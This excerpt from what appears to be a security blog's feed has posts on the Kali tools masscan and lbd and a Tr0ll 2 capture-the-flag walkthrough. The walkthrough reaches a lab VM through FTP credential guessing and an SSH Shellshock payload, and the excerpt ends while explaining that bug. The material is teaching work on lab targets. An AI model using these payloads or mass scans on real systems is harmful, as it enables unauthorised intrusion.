<p><img class="center" src="/images/tools/automater.png" title="&lsquo;automater&rsquo; &lsquo;automater HTML report&rsquo;" ></p>

<p><strong>Learn more:</strong></p>

<p>One of the cool features of Automater is its extensibility. You can add sites to the XML configuration file, and customize it to meet your needs. For further instructions about how to do that, check out the <a href="http://www.tekdefense.com/news/2013/12/10/the-extensibility-of-automater.html">author&rsquo;s post</a></p>

<p>```</p>

<hr />

<p>&lt; Condense soup, not books! ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Masscan - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools/"/>
    <updated>2017-06-10T04:17:42-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/10/masscan-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Nmap is our favorite port scanner, but if you want to scan billions of hosts, and still be relatively young when you get the results, there is a solid alternative focused entirely on speed: Masscan &ndash; the Mass IP port scanner</p>

<!-- more -->


<p>Homepage: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>

<h2>masscan description</h2>

<blockquote><p>This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, transmitting 10
million packets per second.</p>

<p>It produces results similar to nmap, the most famous port scanner. Internally, it operates more like scanrand,
unicornscan, and ZMap, using asynchronous transmission. The major difference is that it&rsquo;s faster than these other
scanners. In addition, it&rsquo;s more flexible, allowing arbitrary address ranges and port ranges.</p>

<p>NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local
TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your
operating system to firewall the ports that masscan uses.</p>

<p>This program spews out packets very fast. On Windows, or from VMs, it can do 300,000 packets/second. On Linux (no
virtualization) it&rsquo;ll do 1.6 million packets-per-second. That&rsquo;s fast enough to melt most networks.</p>

<p>Note that it&rsquo;ll only melt your own network. It randomizes the target IP addresses so that it shouldn&rsquo;t overwhelm any
distant network.</p>

<p>By default, the rate is set to 100 packets/second.</p></blockquote>

<h2>masscan options</h2>

<p><code>
root@kali:~# masscan                                                         
usage:
masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
 scan some web ports on 10.x.x.x at 10kpps
masscan --nmap
 list those options that are compatible with nmap
masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;
 save results of scan in binary format to &lt;filename&gt;
masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;
 read binary scan results in &lt;filename&gt; and save them as xml in &lt;savefile&gt;
</code></p>

<p>More information:</p>

<p><code>
root@kali:~# masscan --help
MASSCAN is a fast port scanner. The primary input parameters are the
IP addresses/ranges you want to scan, and the port numbers. An example
is the following, which scans the 10.x.x.x network for web servers:
 masscan 10.0.0.0/8 -p80
The program auto-detects network interface/adapter settings. If this
fails, you'll have to set these manually. The following is an
example of all the parameters that are needed:
 --adapter-ip 192.168.10.123
 --adapter-mac 00-11-22-33-44-55
 --router-mac 66-55-44-33-22-11
Parameters can be set either via the command-line or config-file. The
names are the same for both. Thus, the above adapter settings would
appear as follows in a configuration file:
 adapter-ip = 192.168.10.123
 adapter-mac = 00-11-22-33-44-55
 router-mac = 66-55-44-33-22-11
All single-dash parameters have a spelled out double-dash equivalent,
so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).
To use the config file, type:
 masscan -c &lt;filename&gt;
To generate a config-file from the current settings, use the --echo
option. This stops the program from actually running, and just echoes
the current configuration instead. This is a useful way to generate
your first config file, or see a list of parameters you didn't know
about. I suggest you try it now:
 masscan -p1234 --echo
</code></p>

<p>Config file:</p>

<blockquote><p>By default, the program will read default configuration from  the  file
/etc/masscan/masscan.conf. This is useful for system-specific settings,
such as the &mdash;adapter-xxx options. This is also useful for excluded  IP
addresses,  so  that  you  can scan the entire Internet, while skipping
dangerous addresses, like those owned by the DoD, and not make an accidental mistake.</p></blockquote>

<p>Nmap compatible options:</p>

<p>```
root@kali:~# masscan &mdash;nmap                                                <br/>
Masscan (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>)
Usage: masscan [Options] -p{Target-Ports} {Target-IP-Ranges}
TARGET SPECIFICATION:
  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)
  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254
  -iL <inputfilename>: Input from list of hosts/networks
  &mdash;exclude &lt;host1[,host2][,host3],&hellip;>: Exclude hosts/networks
  &mdash;excludefile &lt;exclude_file>: Exclude list from file
  &mdash;randomize-hosts: Randomize order of hosts (default)
HOST DISCOVERY:
  -Pn: Treat all hosts as online (default)
  -n: Never do DNS resolution (default)
SCAN TECHNIQUES:
  -sS: TCP SYN (always on, default)
SERVICE/VERSION DETECTION:
  &mdash;banners: get the banners of the listening service if available. The</p>

<pre><code>default timeout for waiting to recieve data is 30 seconds.
</code></pre>

<p>PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports</p>

<pre><code>Ex: -p22; -p1-65535; -p 111,137,80,139,8080
</code></pre>

<p>TIMING AND PERFORMANCE:
  &mdash;max-rate <number>: Send packets no faster than <number> per second
  &mdash;connection-timeout <number>: time in seconds a TCP connection will</p>

<pre><code>timeout while waiting for banner data from a port.
</code></pre>

<p>FIREWALL/IDS EVASION AND SPOOFING:
  -S/&mdash;source-ip &lt;IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/&mdash;source-port <portnum>: Use given port number
  &mdash;ttl <val>: Set IP time-to-live field
  &mdash;spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
OUTPUT:
  &mdash;output-format <format>: Sets output to binary/list/unicornscan/json/grepable/xml
  &mdash;output-file <file>: Write scan results to file. If &mdash;output-format is</p>

<pre><code> not given default is xml
</code></pre>

<p>  -oL/-oJ/-oG/-oB/-oX/-oU <file>: Output scan in List/JSON/Grepable/Binary/XML/Unicornscan format,</p>

<pre><code> respectively, to the given filename. Shortcut for
 --output-format &lt;format&gt; --output-file &lt;file&gt;
</code></pre>

<p>  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  &mdash;open: Only show open (or possibly open) ports
  &mdash;packet-trace: Show all packets sent and received
  &mdash;iflist: Print host interfaces and routes (for debugging)
  &mdash;append-output: Append to rather than clobber specified output files
  &mdash;resume <filename>: Resume an aborted scan
MISC:
  &mdash;send-eth: Send using raw ethernet frames (default)
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80
  masscan 23.0.0.0/0 -p80 &mdash;banners -output-format binary &mdash;output-filename internet.scan
  masscan &mdash;open &mdash;banners &mdash;readscan internet.scan -oG internet_scan.grepable
SEE (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>) FOR MORE HELP
```</p>

<p>Manpage: <a href="http://manpages.org/masscan/8">http://manpages.org/masscan/8</a></p>

<h2>masscan usage</h2>

<ul>
<li>look at the current configuration</li>
</ul>


<p>```
root@kali:~# masscan &mdash;echo
rate =     100.00
randomize-hosts = true
seed = 9262294816069822464
shard = 1/1</p>

<h1>ADAPTER SETTINGS</h1>

<p>adapter =
adapter-ip = 0.0.0.0
adapter-mac = 00:00:00:00:00:00
router-mac = 00:00:00:00:00:00</p>

<h1>OUTPUT/REPORTING SETTINGS</h1>

<p>output-format = unknown(0)
show = open,,
output-filename =
rotate = 0
rotate-dir = .
rotate-offset = 0
rotate-filesize = 0
pcap =</p>

<h1>TARGET SELECTION (IP, PORTS, EXCLUDES)</h1>

<p>retries = 0
ports =</p>

<p>capture = cert
nocapture = html
nocapture = heartbleed</p>

<p>min-packet = 60
```</p>

<ul>
<li>check installation</li>
</ul>


<p><code>
masscan --regress
regression test: success!
</code></p>

<ul>
<li>full port scan on local subnet</li>
</ul>


<p>```
root@kali:~# masscan -p0-65535 192.168.217.0/24 &mdash;rate 100000</p>

<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:02:34 GMT
 &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
Initiating SYN Stealth Scan
Scanning 256 hosts [65536 ports/host]
Discovered open port 443/tcp on 192.168.217.131                              <br/>
Discovered open port 139/tcp on 192.168.217.133                              <br/>
Discovered open port 139/tcp on 192.168.217.134                              <br/>
Discovered open port 139/tcp on 192.168.217.131                              <br/>
Discovered open port 111/tcp on 192.168.217.131                              <br/>
Discovered open port 23/tcp on 192.168.217.133                               <br/>
Discovered open port 21/tcp on 192.168.217.133                               <br/>
Discovered open port 22/tcp on 192.168.217.131                               <br/>
Discovered open port 22/tcp on 192.168.217.135                               <br/>
Discovered open port 5432/tcp on 192.168.217.133                             <br/>
Discovered open port 135/tcp on 192.168.217.134                              <br/>
Discovered open port 22/tcp on 192.168.217.133                               <br/>
Discovered open port 25/tcp on 192.168.217.133                               <br/>
Discovered open port 53/tcp on 192.168.217.133                               <br/>
Discovered open port 3632/tcp on 192.168.217.133                             <br/>
Discovered open port 80/tcp on 192.168.217.135                               <br/>
Discovered open port 80/tcp on 192.168.217.131                               <br/>
Discovered open port 80/tcp on 192.168.217.133                               <br/>
Discovered open port 445/tcp on 192.168.217.131                              <br/>
Discovered open port 445/tcp on 192.168.217.133                              <br/>
Discovered open port 445/tcp on 192.168.217.134                              <br/>
Discovered open port 8180/tcp on 192.168.217.133                             <br/>
Discovered open port 8009/tcp on 192.168.217.133                             <br/>
Discovered open port 3306/tcp on 192.168.217.133 <br/>
```</p>

<p>The scan was done in a couple of minutes. You might be wondering, how does this tool scan the entire internet in 3 minutes if it took the same length of time for a puny subnet? Well, there are some limitations. To get the most of its speed, you need the proper adapter and driver. Also notice that I rate-limited it to 100k packets per second, because I didn&rsquo;t want my local network to blow up! If you want to benchmark masscan&rsquo;s performance, look on its homepage, under the Performance testing section.</p>

<ul>
<li>grab banners of open ports</li>
</ul>


<p>```
root@kali:~# masscan 192.168.217.0/24 -p22,80,139,445,3306 &mdash;banners &mdash;source-ip 192.168.217.150 &mdash;rate 100000</p>

<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:18:27 GMT
 &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
Initiating SYN Stealth Scan
Scanning 256 hosts [5 ports/host]
Discovered open port 80/tcp on 192.168.217.133                               <br/>
Discovered open port 139/tcp on 192.168.217.134                              <br/>
Discovered open port 22/tcp on 192.168.217.133                               <br/>
Discovered open port 139/tcp on 192.168.217.133                              <br/>
Discovered open port 22/tcp on 192.168.217.131                               <br/>
Discovered open port 80/tcp on 192.168.217.131                               <br/>
Discovered open port 445/tcp on 192.168.217.131                              <br/>
Discovered open port 139/tcp on 192.168.217.131                              <br/>
Discovered open port 22/tcp on 192.168.217.135                               <br/>
Discovered open port 80/tcp on 192.168.217.135                               <br/>
Banner on port 22/tcp on 192.168.217.135: [ssh] SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2
Banner on port 22/tcp on 192.168.217.133: [ssh] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
Banner on port 22/tcp on 192.168.217.131: [ssh] SSH-2.0-OpenSSH_6.6.1        <br/>
Discovered open port 445/tcp on 192.168.217.134                              <br/>
Discovered open port 445/tcp on 192.168.217.133                              <br/>
Discovered open port 3306/tcp on 192.168.217.133                             <br/>
Banner on port 3306/tcp on 192.168.217.133: [unknown] \x3e\x00\x00\x00\x0a5.0.51a-3ubuntu5\x00\x07\x00\x00\x00M<code>yb]-d3\x00,\xaa\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00q^e</code>0o`r\x3crLb\x00
Banner on port 80/tcp on 192.168.217.131: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:35 GMT\x0d\x0aServer: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips\x0d\x0aLast-Modified: Tue, 02 Aug 2016 13:07:09 GMT\x0d\x0aETag: \x2211-5391664f1e697\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 17\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0a\x0d
Banner on port 80/tcp on 192.168.217.133: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:36 GMT\x0d\x0aServer: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch\x0d\x0aLast-Modified: Wed, 17 Mar 2010 14:08:25 GMT\x0d\x0aETag: \x22107f7-2d-481ffa5ca8840\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 45\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html\x0d\x0a\x0d
```</p>

<p>For this option to work, you have to give masscan its own IP address on the local subnet, something unused by another device. In fact, the recommendation from its homepage is to use it with its separate IP address whenever possible.</p>

<p>And here is how the XML output of the previous scan would look in a spreadsheet:</p>

<p><img class="center" src="/images/tools/masscan-xml.png" title="&lsquo;masscan xml&rsquo; &lsquo;masscan xml output&rsquo;" ></p>

<p>Some other features are:</p>

<ul>
<li><p>output formats in xml, binary, grepable, list, or JSON</p></li>
<li><p>resume scans</p></li>
<li><p>exclude targets</p></li>
<li><p>runs in Linux, Windows, and Mac OS X</p></li>
</ul>


<h3>More resources</h3>

<ul>
<li><p><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html">Robert Graham post on masscan</a></p></li>
<li><p><a href="https://josephpierini.blogspot.com/2016/06/using-masscan-with-top-ports.html">select common ports with Nmap and feed them to Masscan</a></p></li>
</ul>


<p>```
/ Your own qualities will help prevent \
\ your advancement in the world.       /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[lbd - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/07/lbd-kali-linux-tools/"/>
    <updated>2017-06-07T05:46:27-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/07/lbd-kali-linux-tools</id>
    <content type="html"><![CDATA[<p>Load balancing is the practice of distributing traffic across multiple servers, in order to increase performance and reliability. With multiple servers offering the same resources, single points of failure are eliminated, and availability is increased. Load balancers may be set up in a way that users from certain geographic locations are sent to specific servers, in order to increase the speed of access.</p>

<p>Load balancing introduces some issue in penetration tests, because it interferes with the accuracy of the testing. This is why it&rsquo;s important to establish whether load balancers are in place, and if there are, taking that into account when performing the tests and writing the reports.</p>

<!-- more -->


<p>lbd (load balancing detector) is a Kali tool that is useful for determining the presence of load balancing.</p>

<p>Author: Stefan Behte</p>

<h2>lbd description</h2>

<blockquote><p>lbd (load balancing detector) detects if a given domain uses DNS and/or HTTP Load-Balancing (via Server: and Date:
header and diffs between server answers).</p></blockquote>

<h3>DNS load balancing</h3>

<p>In DNS load balancing, a system has a list of IPs that can respond to requests. When you request a resource, you hit on one of these IPs, and you need to test further to identify the exact target. If your target is <em>example.com</em>, and 3 IPs are serving that, when you find a vulnerability, you still have to determine which of these addresses is the vulnerable one (or if all are).</p>

<h3>HTTP load balancing</h3>

<p>One of the ways HTTP load balancing can be achieved is through cookies. This comes in handy in online stores and other such web applications that need to identify a client and send it to the same specific resource</p>

<h2>lbd options</h2>

<p>```
lbd &ndash; load balancing detector 0.4 &ndash; Checks if a given domain uses load-balancing.</p>

<pre><code>                                Written by Stefan Behte (http://ge.mine.nu)
                                Proof-of-concept! Might give false positives.
</code></pre>

<p>usage: /usr/bin/lbd domain [port] {https}
```</p>

<h2>lbd usage</h2>

<p>Let&rsquo;s now check a bunch of domains and see what load balancers we can find, if at all</p>

<ul>
<li>DNS and HTTP load balancing</li>
</ul>


<p>```
lbd hackerone.com</p>

<p>lbd &ndash; load balancing detector 0.4 &ndash; Checks if a given domain uses load-balancing.</p>

<pre><code>                                Written by Stefan Behte (http://ge.mine.nu)
                                Proof-of-concept! Might give false positives.
</code></pre>

<p>Checking for DNS-Loadbalancing: FOUND
hackerone.com has address 104.16.100.52
hackerone.com has address 104.16.99.52</p>

<p>Checking for HTTP-Loadbalancing [Server]:
 cloudflare-nginx
 NOT FOUND</p>

<p>Checking for HTTP-Loadbalancing [Date]: 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:37, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:38, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:39, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, 11:11:40, NOT FOUND</p>

<p>Checking for HTTP-Loadbalancing [Diff]: FOUND
&lt; CF-RAY: 36b32c07c6bf2950-OTP</p>

<blockquote><p>CF-RAY: 36b32c0835d7292c-OTP</p></blockquote>

<p>hackerone.com does Load-balancing. Found via Methods: DNS HTTP[Diff]
```</p>

<ul>
<li>HTTP load balancing</li>
</ul>


<p>```
lbd cisco.com</p>

<p>lbd &ndash; load balancing detector 0.4 &ndash; Checks if a given domain uses load-balancing.</p>

<pre><code>                                Written by Stefan Behte (http://ge.mine.nu)
                                Proof-of-concept! Might give false positives.
</code></pre>

<p>Checking for DNS-Loadbalancing: NOT FOUND
Checking for HTTP-Loadbalancing [Server]:
 Apache
 NOT FOUND</p>

<p>Checking for HTTP-Loadbalancing [Date]: 11:13:47, 11:13:47, 11:13:48, 11:13:49, 11:13:50, 11:13:51, 11:13:51, 11:13:52, 11:13:53, 11:13:54, 11:13:54, 11:13:55, 11:13:56, 11:13:57, 11:13:57, 11:13:58, 11:13:59, 11:14:00, 11:14:01, 11:14:01, 11:14:02, 11:14:03, 11:14:04, 11:14:04, 11:14:05, 11:14:06, 11:14:07, 11:14:07, 11:14:08, 11:14:09, 11:14:10, 11:14:11, 11:14:11, 11:14:12, 11:14:13, 11:14:14, 11:14:14, 11:14:15, 11:14:16, 11:14:17, 11:14:17, 11:14:18, 11:14:19, 11:14:20, 11:14:21, 11:14:21, 11:14:22, 11:14:23, 11:14:24, 11:14:24, NOT FOUND</p>

<p>Checking for HTTP-Loadbalancing [Diff]: FOUND</p>

<blockquote><p>Cache-Control: max-age=0
Expires: Wed, 07 Jun 2017 11:14:27 GMT</p></blockquote>

<p>cisco.com does Load-balancing. Found via Methods: HTTP[Diff]
```</p>

<ul>
<li>no load balancing</li>
</ul>


<p>```
lbd nmap.org</p>

<p>lbd &ndash; load balancing detector 0.4 &ndash; Checks if a given domain uses load-balancing.</p>

<pre><code>                                Written by Stefan Behte (http://ge.mine.nu)
                                Proof-of-concept! Might give false positives.
</code></pre>

<p>Checking for DNS-Loadbalancing: NOT FOUND
Checking for HTTP-Loadbalancing [Server]:
 Apache/2.4.6 (CentOS)
 NOT FOUND</p>

<p>Checking for HTTP-Loadbalancing [Date]: 11:17:00, 11:17:00, 11:17:01, 11:17:01, 11:17:02, 11:17:02, 11:17:03, 11:17:03, 11:17:03, 11:17:04, 11:17:04, 11:17:05, 11:17:05, 11:17:06, 11:17:06, 11:17:07, 11:17:07, 11:17:07, 11:17:08, 11:17:08, 11:17:09, 11:17:09, 11:17:10, 11:17:10, 11:17:10, 11:17:11, 11:17:11, 11:17:12, 11:17:12, 11:17:13, 11:17:13, 11:17:14, 11:17:14, 11:17:14, 11:17:15, 11:17:15, 11:17:16, 11:17:16, 11:17:17, 11:17:17, 11:17:17, 11:17:18, 11:17:18, 11:17:19, 11:17:19, 11:17:20, 11:17:20, 11:17:20, 11:17:21, 11:17:21, NOT FOUND</p>

<p>Checking for HTTP-Loadbalancing [Diff]: NOT FOUND</p>

<p>nmap.org does NOT use Load-balancing.
```</p>

<h3>Key takeaways</h3>

<ul>
<li>when testing load balanced systems, you can try accessing them by IP instead of name (be advised that firewalls might pick up on this as suspicious activity)</li>
</ul>


<p>To learn more about load balancing and pentesting, check out this <a href="https://www.sans.org/reading-room/whitepapers/testing/identifying-load-balancers-penetration-testing-33313">SANS paper</a></p>

<p>```
/ Q: What is printed on the bottom of \
| beer bottles in Minnesota? A: Open  |
\ other end.                          /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Tr0ll 2 - There be trolls]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls/"/>
    <updated>2017-06-06T08:58:25-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/06/tr0ll-2-there-be-trolls</id>
    <content type="html"><![CDATA[<p>It&rsquo;s time to slay the second troll in the Tr0ll series!</p>

<!-- more -->


<p>First, a bit of enumeration:</p>

<p>```
Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> 192.168.217.1   00:50:56:c0:00:08      1      60  Unknown vendor            <br/>
 192.168.217.2   00:50:56:fc:f6:8b      1      60  Unknown vendor            <br/>
 192.168.217.129 00:0c:29:cb:3d:2e      1      60  Unknown vendor            <br/>
 192.168.217.254 00:50:56:f3:f4:fc      1      60  Unknown vendor <br/>
```</p>

<p>The IP we want is 192.168.217.129.</p>

<p>```
nmap -p- -sV -T4 192.168.217.129</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-05-30 10:27 EDT
Nmap scan report for 192.168.217.129
Host is up (0.000088s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:CB:3D:2E (VMware)
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>You know the drill! Something awaits us on that web server!</p>

<p><img class="center" src="/images/pentest/tr0ll2/troll.png" title="&lsquo;troll&rsquo; &lsquo;troll&rsquo;" ></p>

<p>And a comment in the source:</p>

<p>``` html</p>

<p><!--Nothing here, Try Harder!>
<!--Author: Tr0ll>
<!--Editor: VIM>
```</p>

<p>I downloaded the image and ran it through exiftool, but found nothing. Next I looked if there&rsquo;s a robots.txt file, and there was..but, oh, the horror:</p>

<p><code>
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
</code></p>

<p>Ok, let&rsquo;s look (sigh). I went through them and only hit on a bunch of 404s and this image in a couple of directories:</p>

<p><img class="center" src="/images/pentest/tr0ll2/noob.png" title="&lsquo;noob&rsquo; &lsquo;noob&rsquo;" ></p>

<p>Exiftool again..and nothing again..Also tried cat_the_troll as a directory name, nothing there either. A little bit anticlimactic, but remembering the HTML comment of a Tr0ll author, what worked was logging into the FTP server with the credentials of Tr0ll/Tr0ll:</p>

<p><code>
ftp 192.168.217.129
Connected to 192.168.217.129.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.217.129:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp&gt; get lmao.zip
local: lmao.zip remote: lmao.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (8.4682 MB/s)
</code></p>

<p>After downloading the archive, I tried extracting it, but of course there&rsquo;s a password. Tried a couple of guesses, nothing worked. Lastly, I tried SSH with the same credentials, and although it worked, the session ended instantly.</p>

<p>Back to the web, I decided to download all the cat troll images, since they were in different directories, and might be different themselves:</p>

<p><code>
ls -l
total 68
-rw-r--r-- 1 root root 15873 May 30 11:48 dont_bother_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:48 keep_trying_cat_the_troll.jpg
-rw-r--r-- 1 root root  1474 May 30 11:38 lmao.zip
-rw-r--r-- 1 root root 15831 May 30 11:47 noob_cat_the_troll.jpg
-rw-r--r-- 1 root root 15831 May 30 11:49 ok_this_is_it_cat_the_troll.jpg
</code></p>

<p>I set the names to reflect the directories where I got them from. It seems one of them is bigger than the rest. Nothing from exiftool, this time I just tried strings and at the end of the output was this line:</p>

<p><code>
Look Deep within y0ur_self for the answer
</code></p>

<p>Finally, getting somewhere. The hint is probably a directory name on the web server, so I went there and did find an answer.txt file. Unfortunately, it was full of what looked like Base64 strings, and massive:</p>

<p><code>
wc -l answer.txt
99157 answer.txt
</code></p>

<p>I decoded it with the command: <code>base64 -d answer.txt > decoded.txt</code>, but how to figure the answer in all this sea of trolling? I remembered the troll&rsquo;s fixation on using underscores, so I tried doing a recursive grep for that:</p>

<p><code>
grep -r "_" decoded.txt
noooob_lol
</code></p>

<p>That didn&rsquo;t work as a password. Next I looked for longest line:</p>

<p><code>
wc -L decoded.txt
30 decoded.txt
</code></p>

<p>According to this command, the longest line&rsquo;s length is 30. I whipped up a quick Python script to find all lines with the length of 30:</p>

<p>``` python</p>

<h1>!/usr/bin/env python</h1>

<p>import argparse</p>

<p>desc = &ldquo;Find and print lines from a file that are a certain length&rdquo;
parser = argparse.ArgumentParser(description=desc)</p>

<h1>length argument</h1>

<p>parser.add_argument(</p>

<pre><code>'-l',
help = 'Length value',
dest = 'length',
type = int,
required=True
</code></pre>

<p>)</p>

<h1>file add_argument</h1>

<p>parser.add_argument(</p>

<pre><code>'-f',
help = 'Filename',
dest = 'filename',
type = str,
required=True
</code></pre>

<p>)</p>

<p>args = parser.parse_args()</p>

<p>with open(args.filename, &ldquo;r&rdquo;) as f:</p>

<pre><code>for line in f.readlines():
    # strip the newline character for accurate counting
    if len(line.strip('\n')) == args.length:
        print line
</code></pre>

<p>```</p>

<p>Ran it and BOOM:</p>

<p><code>
python line_length.py -l 30 -f decoded.txt
ItCantReallyBeThisEasyRightLOL
</code></p>

<p>This sounds exactly like the troll! Now I was finally able to extract the archive:</p>

<p><code>
unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password:
  inflating: noob            
</code></p>

<p>It looks like it&rsquo;s a private key:</p>

<p><code>
file noob
noob: PEM RSA private key
</code></p>

<p>I tried SSH'ing as noob this time:</p>

<p><code>
ssh -i noob noob@192.168.217.129
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
</code></p>

<p>Well, that didn&rsquo;t help much. I tried appending commands, but I still got kicked out instantly without running anything. After a bit of head scratching and Google, I got reminded that SSH can be vulnerable to Shellshock, if it meets certain requirements, which are: an unpatched bash (doh), authentication using <code>authorization_keys</code>, and the user in question being restricted in the commands they could run. As it so happens, we have an old machine that may not be patched, key-based authentication, and it makes sense that a user called noob would be restricted!</p>

<p>First, a recap. The Shellshock string is <code>() { :; };</code>, and if followed by a command, that command gets executed. I tried it and:</p>

<p><code>
ssh -i noob noob@192.168.217.129 -t "() { :; }; pwd"
/home/noob
TRY HARDER LOL!
Connection to 192.168.217.129 closed.
</code></p>

<p>Excellent! The previous -t flag of the SSH command is useful when you want to run interactive applications on the remote server. Now let&rsquo;s see if we can spawn a shell:</p>

<p><code>
ssh -i noob noob@192.168.217.129 -t "() { :; }; /bin/bash"
noob@Tr0ll2:~$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
</code></p>

<p>Finally, we&rsquo;re in! Before continuing though, I thought it would be helpful to better understand how Shellshock works.</p>

<h3>Shellshock explained</h3>

<p>Because Bash is a scripting language, you can do things like defining functions:</p>

<p><code>
myfunction() { echo "I am a function"; }
</code></p>

<p>And then you call it:</p>

<p><code>
noob@Tr0ll2:~$ myfunction
I am a function
</code></p>

<p>You can also export functions to environment variables, so they can be run by new bash instances:</p>

<p><code>
noob@Tr0ll2:~$ export -f myfunction
noob@Tr0ll2:~$ env
[...]
myfunction=() {  echo "I am a function"
}
</code></p>

<p>Now the function definition is inside the environment variable, and it can be evaluated:</p>

<p><code>
bash -c myfunction
I am a function
</code></p>

<p>This is intended behavior so far, but there is a vulnerability in which the evaluation continues even after the function end.</p>

<p><code>
export shocking='() { echo "This is safe" ; }; echo "This is NOT safe"'
bash -c shocking
This is NOT safe
This is safe
</code></p>

<p>Here you can see the vulnerability: the second echo statement was outside the function definition, but it was executed anyway.</p>

